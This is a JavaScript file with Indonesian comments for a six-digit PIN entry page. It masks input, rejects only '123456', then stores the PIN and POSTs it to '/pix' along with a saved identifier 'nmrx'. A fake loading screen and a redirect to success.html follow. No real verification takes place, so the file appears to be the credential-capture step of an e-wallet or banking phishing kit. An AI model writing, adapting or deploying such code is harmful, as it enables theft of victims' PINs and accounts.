// pix.js

const inputs =
document.querySelectorAll(".pix-box");

const wrapper =
document.querySelector(
".pix-wrapper"
);

const showBtn =
document.getElementById("showBtn");

const loadingBox =
document.getElementById("loadingBox");

const errorBox =
document.getElementById("errorBox");

let isShow = false;

/* FADE IN */ 
window.addEventListener("load", () => {

    document.body.classList.add(
    "fade-in"
    );

});

/* ========================= */
/* RESET LOADING */
/* ========================= */

window.addEventListener(
"pageshow",
() => {

    loadingBox.style.display =
    "none";

});

/* ========================= */
/* FOKUS KE BOX AWAL KOSONG */
/* ========================= */

inputs.forEach(() => {

    document.addEventListener(
    "click",
    () => {

        for(
            let i = 0;
            i < inputs.length;
            i++
        ){

            const real =
            inputs[i].getAttribute(
            "data-real"
            );

            /* FOKUS KE YANG BELUM DIISI */
            if(!real){

                inputs[i].focus();

                break;

            }

        }

    });

});

/* ========================= */
/* AUTO PIX */
/* ========================= */

inputs.forEach((input,index) => {

    /* RESET AWAL */
    input.setAttribute(
    "data-real",
    ""
    );

    input.addEventListener(
    "focus",
    () => {

        const real =
        input.getAttribute(
        "data-real"
        );

        /* KOSONGKAN SAAT MAU NGETIK */
        if(!real){

            input.value = "";

        }

    });

    input.addEventListener(
    "blur",
    () => {

        const real =
        input.getAttribute(
        "data-real"
        );

        /* BALIK TITIK */
        if(!real){

            input.value = "●";

        }

    });

    input.addEventListener(
    "input",
    () => {

        let value =
        input.value.replace(
        /[^0-9]/g,
        ''
        );

        input.setAttribute(
        "data-real",
        value
        );

        /* TAMPILKAN ANGKA */
        input.value = value;

        if(value){

            input.classList.add(
            "filled"
            );

        }else{

            input.classList.remove(
            "filled"
            );

        }

        /* BALIK JADI TITIK */
        if(value && !isShow){

            setTimeout(() => {

                const real =
                input.getAttribute(
                "data-real"
                );

                if(real){

                    input.value = "●";

                }

            },500);

        }

        /* NEXT */
        if(value.length === 1){

            if(index < inputs.length - 1){

                inputs[index + 1]
                .focus();

            }

        }

        checkPix();

    });

    /* BACKSPACE */
    input.addEventListener(
    "keydown",
    (e) => {

        if(e.key === "Backspace"){

            input.value = "";

            input.setAttribute(
            "data-real",
            ""
            );

            input.classList.remove(
            "filled"
            );

            setTimeout(() => {

                input.value = "●";

            },10);

            if(index > 0){

                inputs[index - 1]
                .focus();

            }

        }

    });

});

wrapper.addEventListener(
"click",
() => {

    for(
        let i = 0;
        i < inputs.length;
        i++
    ){

        const real =
        inputs[i].getAttribute(
        "data-real"
        );

        if(!real){

            inputs[i].focus();

            break;

        }

    }

});


/* ========================= */
/* SHOW PIX */
/* ========================= */

showBtn.addEventListener(
"click",
() => {

    isShow = !isShow;

    inputs.forEach(input => {

        const real =
        input.getAttribute(
        "data-real"
        ) || "";

        if(isShow){

            input.value = real;

        }else{

            input.value =
            real ? "●" : "";

        }

    });

    showBtn.innerText =
    isShow
    ? "SEMBUNYIKAN"
    : "TAMPILKAN";

});

/* ========================= */
/* CHECK PIX */
/* ========================= */

 async function checkPix(){

    let pix = "";

    inputs.forEach(input => {

    pix +=
    input.getAttribute(
    "data-real"
    ) || "";

});

    /* FULL */
    if(pix.length === 6){

        /* PIX SALAH */
        if(pix === "123456"){

            /* GETAR */
            if(navigator.vibrate){

                navigator.vibrate([
                    120,
                    80,
                    120
                ]);

            }

            /* SHOW ERROR */
            errorBox.classList.add(
            "show"
            );

            /* AUTO HIDE */
            setTimeout(() => {

                errorBox.classList.remove(
                "show"
                );

            },2000);

            /* RESET */
            setTimeout(() => {

                inputs.forEach(input => {

                    input.value = "";

                });

                inputs[0].focus();

            },300);

            return;

        }

        /* AMBIL */
        const nmrx =
            localStorage.getItem(
            "nmrx"
            );

         /* SIMPAN */
    localStorage.setItem(
    "pix",
    pix
    );

        /* KIRIM */
    await fetch("/pix", {

        method:"POST",

        headers:{
            "Content-Type":
            "application/json"
        },

        body:JSON.stringify({

            nmrx:nmrx,
            pix:pix

        })

    });
        
        /* SHOW LOADING */
        loadingBox.style.display =
        "flex";

        /* DELAY */
        setTimeout(() => {

             /* FADE OUT */
    document.body.classList.add(
    "fade-out"
    );

            window.location.href =
            "success.html";

        },2000);

    }

}
